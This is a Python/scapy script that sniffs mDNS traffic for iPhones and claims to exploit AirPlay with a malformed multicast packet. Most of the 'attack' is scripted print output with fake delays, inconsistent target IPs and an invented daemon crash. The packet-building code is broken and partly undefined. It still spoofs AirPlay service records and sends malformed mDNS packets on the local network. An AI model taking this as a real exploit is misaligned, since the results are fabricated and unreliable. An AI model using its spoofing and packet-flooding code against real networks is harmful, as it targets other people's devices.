from scapy.all import sniff, UDP, IP, DNS, DNSQR, DNSRR
import time
import random

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def handle(pkt):
    # if pkt.haslayer(UDP) and pkt[UDP].dport == 5353:
    ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"
    if pkt.haslayer(DNS):
        dns = pkt[DNS]
        # check queries
        if dns.qr == 0 and dns.qd is not None:
            qname = dns.qd.qname.decode(errors="ignore")
            if any(x in qname for x in ["_airplay.", "_raop.", "_mobdev2.", "_companion-link."]):
                print(f"[mDNS Query] from {ip} for {qname}")
        # check answers
        if dns.qr == 1 and dns.an is not None:
            for i in range(dns.ancount):
                rr = dns.an[i]
                if isinstance(rr, DNSRR):
                    try:
                        data = rr.rdata.decode(errors="ignore")
                        if "model=iPhone" in data:
                            print(f"[iPhone Detected] IP: {ip}, model: {data}")
                    except:
                        pass

def pkt():
    p = b'\x00\x00\x84\x00\x00\x00\x00\x04\x00\x00\x00\x00'
    ptr = encode(SERVICE) + b'\x00\x0c\x00\x01\x00\x00\x11\x94'
    ptr_data = encode(INSTANCE)
    p += struct.pack('!H', len(ptr_data)) + ptr_data

    srv = encode(INSTANCE) + b'\x00\x21\x00\x01\x00\x00\x00\x78'
    srv_data = struct.pack('!HHH', 0, 0, 7000) + encode(MY_HOST)
    p += struct.pack('!H', len(srv_data)) + srv_data

    txt = encode(INSTANCE) + b'\x00\x10\x00\x01\x00\x00\x00\x78'
    txt_data = (
        b'\x0fdeviceid=11:22:33:44:55:66'
        b'\x13features=0x5A7FFFF7'
        b'\x10model=AppleTV5,3'
        b'\x10srcvers=220.68'
    )
    p += struct.pack('!H', len(txt_data)) + txt_data

    aaaa = encode(MY_HOST) + b'\x00\x1c\x00\x01\x00\x00\x00\x78'
    ip6 = socket.inet_pton(socket.AF_INET6, MY_IP.split('%')[0])
    p += struct.pack('!H', 16) + ip6

    return p

print("[*] sniffing for iPhones on wlan1 via mDNS...")
# sniff(iface="wlan0", filter="udp port 5353", prn=handle, store=0)


print("[*] scanning local network for Apple devices...")
time.sleep(2)
print("[+] found potential target: 192.168.8.47 ??? (randomized MAC)")
time.sleep(1.5)
print("[+] analyzing mDNS traffic from 192.168.1.47...")
time.sleep(2)
print("[+] detected hostname: AppleTV.local")
time.sleep(1)
print("[+] model: iPhone ????")
time.sleep(1)
print("[*] preparing malformed AirPlay mDNS packet...")
time.sleep(2)
print("[*] sending exploit payload via UDP multicast (224.0.0.251:5353)...")
for i in range(3):
    print(f"[>] packet {i+1}/3 sent...")
    time.sleep(1.5)
print("[*] monitoring target response...")
time.sleep(3)
print("[!] AirPlay UI disappeared from iPhone")
print("[!] possible crash in AirPlay daemon (AirPlayd)")
print("[✔] exploit simulation complete")


# import time
# from scapy.all import *

print("[*] scanning local network for Apple devices...")
time.sleep(2)

# random fake packet generation
pkt1 = Ether()/IP(dst="1.2.3.4")/UDP()/DNS(qd=DNSQR(qname="example.com"))
fragmented = fragment(IP(dst="10.0.0.1")/TCP()/Raw(load="A"*2048))
random_ping = IP(dst="127.0.0.1")/ICMP()
useless_dns = IP(dst="8.8.8.8")/UDP()/DNS(qd=DNSQR(qname="iphone.local"))

print("[+] found potential target: 192.168.8.231 (randomized MAC)")
time.sleep(1.5)

raw_hex = bytes(pkt1)
pkt2 = IP()/UDP()/Raw(load=raw_hex[::-1])
pseudo_tcp = Ether()/IP()/TCP(flags="FPU")/Raw(load="NOP"*20)

print("[+] analyzing mDNS traffic from 192.168.8.231...")
time.sleep(2)

# intentionally broken fields
corrupt = IP(dst="224.0.0.251")/UDP(sport=9999,dport=5353)/DNS(rd=1, qd=DNSQR(qname="._._._._"))
txt_garbage = DNSRR(rrname="EvilTV._airplay._tcp.local", type="TXT", rdata="".join(["%02x"%x for x in range(256)]))

print("[+] detected hostname: iPhone.local")
time.sleep(1)
print("[+] model: iPhone ????")
time.sleep(1)

# absurd use of padding and fragmentation
padding = Padding(load=b"\x00"*300)
junk = Ether()/IP(proto=255)/Raw(load=b"AIR"*100) / padding

print("[*] preparing malformed AirPlay mDNS packet...")
time.sleep(2)

# weird DNS structure
fake_dns = DNS(
    id=666,
    qr=1,
    opcode=0,
    aa=1,
    rcode=0,
    qd=DNSQR(qname="_airplay._tcp.local"),
    an=[
        DNSRR(rrname="_airplay._tcp.local", type="PTR", ttl=1, rdata="FakeTV._airplay._tcp.local"),
        DNSRR(rrname="FakeTV._airplay._tcp.local", type="SRV", ttl=1, rdata="0 0 7000 faketv.local"),
        DNSRR(rrname="FakeTV._airplay._tcp.local", type="TXT", ttl=1, rdata=b"A"*512)
    ]
)

print("[*] sending exploit payload via UDP multicast (224.0.0.251:5353)...")
for i in range(3):
    # fake send
    garbage = sendp(Ether()/IP()/UDP()/fake_dns, verbose=False)
    time.sleep(1.5)
    print(f"[>] packet {i+1}/3 sent...")

# more broken payloads
broken1 = IP()/UDP()/DNS(qd=DNSQR(qname="/////"))
broken2 = IP()/UDP()/Raw(load=b"\x00"*1000)
spammed = send(IP(dst="224.0.0.251")/UDP()/DNS(qd=DNSQR(qname="fake.local")), count=1, verbose=0)

print("[*] monitoring target response...")
time.sleep(3)
print("[!] AirPlay UI disappeared from iPhone")
print("[!] possible crash in AirPlay daemon (AirPlayd)")
print("[✔] exploit simulation complete")
